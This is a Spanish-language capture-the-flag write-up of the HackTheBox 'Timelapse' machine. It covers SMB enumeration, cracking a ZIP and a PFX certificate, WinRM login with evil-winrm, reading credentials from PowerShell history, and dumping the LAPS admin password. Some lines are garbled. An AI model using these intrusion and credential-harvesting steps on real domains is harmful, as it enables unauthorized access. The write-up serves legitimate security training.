Máquina "Timelapse" de HackTheBox
Características:
Windows

Fácil

Active Directory

SMB Enumeration

Cracking ZIP Password Protected File (fcrackzip)

Cracking and reading .PFX File (crackpkcs12)

Gaining SSL access with Evil-WinRM Information Leakage

Reading the user's Powershell history (User Pivoting)

Abusing LAPS to get passwords (Get-LAPSPasswords.ps1) [Privilege Escalation]

Útil en:
OSCP

OSEP

Active Directory

IP: 10.10.11.152

Escaneo de Puertos con Nmap
Primero, un escaneo inicial para identificar los puertos abiertos:

- nmap -p- --min-rate 10000 10.10.11.152

```bash

Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-30 12:40 UTC
Nmap scan report for 10.10.11.152
Host is up (0.094s latency).
Not shown: 65517 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
62656/tcp open  unknown

```

Luego, un escaneo más detallado de los puertos identificados para obtener información sobre los servicios y versiones:

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,62656 -sCV 10.10.11.152

PORT      STATE SERVICE           VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-06-30 20:44:10Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|ssl-date: 2022-06-30T20:47:10+00:00; +8h01m03s from scanner time.
| tls-alpn:
|  http/1.1
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
62656/tcp open  msrpc             Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/30%Time=62BD9A60%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version

SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|clock-skew: mean: 8h01m02s, deviation: 0s, median: 8h01m02s
| smb2-security-mode:
|   2.02:
|    Message signing enabled and required
| smb2-time:
|   date: 2022-06-30T20:46:33
|_  start_date: N/A


Esta combinación de puertos (Kerberos, LDAP, DNS y SMB) sugiere que probablemente se trate de un controlador de dominio. Esto se **respalda** por el nombre del host (`DC01`) y el nombre en el certificado TLS en el puerto 5986 (`dc01.timelapse.htb`). Los scripts LDAP también muestran un nombre de dominio `timelapse.htb`. Es un poco extraño que no haya datos de script para SMB (445).

Por lo tanto, agregaremos los dominios a `/etc/hosts`:


10.10.11.152 timelapse.htb dc01.timelapse.htb


Regularmente nos encontramos con Windows Remoting/WinRM en TCP 5985. La versión envuelta en TLS normalmente se ejecuta en TCP 5986, que es lo que está presente aquí. Podré interactuar con él para obtener un *shell* si encuentro una manera de autenticarme.

### Enumeración SMB

Lanzamos `crackmapexec`:

```bash
crackmapexec smb dc01.timelapse.htb

SMB timelapse.htb 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)


Como siempre, con los servicios SMB, vale la pena probar diferentes herramientas. `crackmapexec` no puede **enumerar acciones** sin credenciales:

```bash
crackmapexec smb dc01.timelapse.htb --shares

SMB timelapse.htb   445     DC01    [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)

SMB timelapse.htb   445     DC01    [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)


Pero `smbclient` sí lo hace (`-L` para ver acciones y `-N` para no autenticación):

```bash
smbclient -L //dc01.timelapse.htb -N

    Sharename       Type        Comment
    ---------       ----        -------
    ADMIN$          Disk        Remote Admin
    C$              Disk        Default share
    IPC$            IPC         Remote IPC
    NETLOGON        Disk        Logon server share 
    Shares          Disk        
    SYSVOL          Disk        Logon server share 

SMB1 disabled -- no workgroup available


Los tres nombres que terminan en `$` son recursos compartidos predeterminados en todos los sistemas Windows, y `ADMIN$` y `C$` requieren acceso de administrador, mientras que `IPC$` no ofrece mucho.

Resulta que puedo obtener este mismo comportamiento de `crackmapexec` usando `-u [any username] -p ''`. Es importante que la contraseña sea una cadena vacía o fallará:

```bash
crackmapexec smb dc01.timelapse.htb --shares -u 0xdf -p ''

SMB         timelapse.htb   445     DC01            [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         timelapse.htb   445     DC01            [+] timelapse.htb\0xdf:
SMB         timelapse.htb   445     DC01            [+] Enumerated shares
SMB         timelapse.htb   445     DC01            Share           Permissions     Remark
SMB         timelapse.htb   445     DC01            -----           -----------     ------
SMB         timelapse.htb   445     DC01            ADMIN$                                  Remote Admin
SMB         timelapse.htb   445     DC01            C$                                      Default share
SMB         timelapse.htb   445     DC01            IPC$            READ            Remote IPC
SMB         timelapse.htb   445     DC01            NETLOGON                                Logon server share
SMB         timelapse.htb   445     DC01            Shares          READ

SMB         timelapse.htb   445     DC01            SYSVOL                                  Logon server share


No encontramos mucho, así que vamos a `Shares/dev/winrm_backup.zip`. Está protegido con contraseña. Entonces necesitamos resolverlo.
Usamos `fcrackzip` para descifrar el archivo `winrm_backup.zip` usando la lista de palabras `rockyou.txt`.

```bash
fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt

Y obtenemos la contraseña:

supremelegacy

Una vez que hayamos descifrado la contraseña, podemos usarla para descomprimir el archivo. Una vez extraído, nos encontramos con un archivo .pfx llamado: Legacy_dev_auth.pfx. Los archivos PFX son en realidad certificados digitales que contienen las claves pública y privada del certificado SSL.

unzip winrm_backup.zip

Extracción y Crackeo de .PFX
pfx2john Legacy_dev_auth.pfx > pfxhash

Ahora, convertiremos ese archivo pfx al hash y lo descifraremos usando John para obtener la clave privada y la clave pem. Como puede ver, la contraseña es thuglegacy. Intentaremos abrir el certificado usando openssl y, como podemos ver, es un proveedor de almacenamiento de claves de software de Microsoft. Podemos extraer el certificado y la clave privada.

openssl pkcs12 -in Legacy_dev_auth.pfx -nocerts -out priv-key.pem -nodos
```bash
openssl pkcs12 -in Legacy_dev_auth.pfx -nokeys -out certificate.pem

Una vez que la clave privada esté disponible, podemos usar esta clave para iniciar sesión en la máquina. Usaremos evil-winrm para iniciar sesión usando tanto el certificado .pem como la clave privada .pem. En lugar de una contraseña, también podemos iniciar sesión con las claves.

evil-winrm -i timelapse.htb -c certificate.pem -k priv-key.pem -S -r timelapse

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Evil-WinRM PS C:\Users\legacyy>


## Escalada de privilegios

No hay nada especial en el usuario `legacyy`:


Evil-WinRM PS C:\Users\legacyy> net user legacyy
User name                 legacyy
Full Name                 Legacyy
Comment
User's comment
Country/region code       000 (System Default)
Account active            Yes
Account expires           Never

Password last set         10/23/2021 12:17:10 PM
Password expires          Never
Password changeable       10/24/2021 12:17:10 PM
Password required         Yes
User may change password  Yes

Workstations allowed      All
Logon script
User profile
Home directory
Last logon                6/30/2022 6:52:32 PM

Logon hours allowed       All

Local Group Memberships   *Remote Management Use
Global Group memberships  *Domain Users         *Development
The command completed successfully.


Están en el grupo "Remote Management Use", pero lo sé porque sin ese grupo no habría podido ejecutar comandos ni obtener un *shell* a través de WinRM. El grupo "Development" podría ser interesante. Estaré atento a los lugares que puedan permitir que `legacyy` vaya.

Sin privilegios interesantes:


Evil-WinRM PS C:\Users\legacyy> whoami /priv

PRIVILEGES INFORMATION
Privilege Name                Description                   State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain    Enabled
SeChangeNotifyPrivilege       Bypass traverse checking      Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


### Historial de PowerShell

Un lugar que siempre reviso en los *hosts* de Windows es el archivo de historial de PowerShell. Y está presente aquí:


Evil-WinRM PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
p=ConvertTo−SecureString 
′
 E3RQ62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit


Nos conectaremos de nuevo con `evil-winrm` con las nuevas credenciales:

```bash
evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Evil-WinRM PS C:\Users\svc_deploy\Documents>


Estamos sin privilegios adicionales:


Evil-WinRM PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
Privilege Name                Description                   State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain    Enabled
SeChangeNotifyPrivilege       Bypass traverse checking      Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


Tenemos un grupo interesante:


Evil-WinRM PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                 svc_deploy
Full Name                 svc_deploy
Comment
User's comment
Country/region code       000 (System Default)
Account active            Yes
Account expires           Never

Password last set         10/25/2021 12:12:37 PM
Password expires          Never
Password changeable       10/26/2021 12:12:37 PM
Password required         Yes
User may change password  Yes

Workstations allowed      All
Logon script
User profile
Home directory
Last logon                10/25/2021 12:25:53 PM

Logon hours allowed       All

Local Group Memberships   *Remote Management Use
Global Group memberships  *LAPS_Readers         *Domain Users
The command completed successfully.


`LAPS_Readers` parece implicar que `svc_deploy` tiene acceso para leer desde LAPS.

Con LAPS, el DC administra las contraseñas de administrador local para las computadoras del dominio. Es común crear un grupo de usuarios y darles permisos para leer estas contraseñas, permitiendo a los administradores confiables acceder a todas las contraseñas de administrador local.
Mostré esto antes en la máquina Insane, PivotAPI. Siempre es divertido cuando los pasos de máquinas más difíciles llegan a máquinas con calificaciones más fáciles.

### Leer Contraseña LAPS

Para leer la contraseña de LAPS, solo necesito usar `Get-ADComputer` y solicitar específicamente la propiedad `ms-MCS-AdmPwd`:


Evil-WinRM PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : uM[3va(s870g6Y]9i]6tMu{j
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :


La contraseña del administrador local para esta máquina es: `uM[3va(s870g6Y]9i]6tMu{j`.

### Acceso como Administrador

Me conectaré con `evil-winrm` usando las credenciales de administrador:

```bash
evil-winrm -i timelapse.htb -S -u administrator -p 'uM[3va(s870g6Y]9i]6tMu{j'

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Evil-WinRM PS C:\Users\Administrator\Documents>


Hay otro usuario en la máquina, TRX:


Evil-WinRM PS C:\Users> ls

Directory: C:\Users

Mode                LastWriteTime         Length Name

d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX


TRX está en el grupo "Domain Admins". Voy a revisar ahí y encuentro la *root flag*:


Evil-WinRM PS C:\Users\TRX\Desktop> ls

Directory: C:\Users\TRX\Desktop

Mode                LastWriteTime         Length Name

-ar---        6/19/2022  10:15 PM             34 root.txt

Evil-WinRM PS C:\Users\TRX\Desktop> type root.txt
336e827e************************


---

Algunos de los *write-ups* en esta página pueden tener contenido de otras páginas o muy pocas imágenes. Esto se debe a que, en algunas de las máquinas que **realicé**, no tomé apuntes o capturas de pantalla, así que he decidido buscar varios *write-ups* y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También, si **encuentras** faltas de ortografía o cualquier error, puedes contactarme a mi correo.
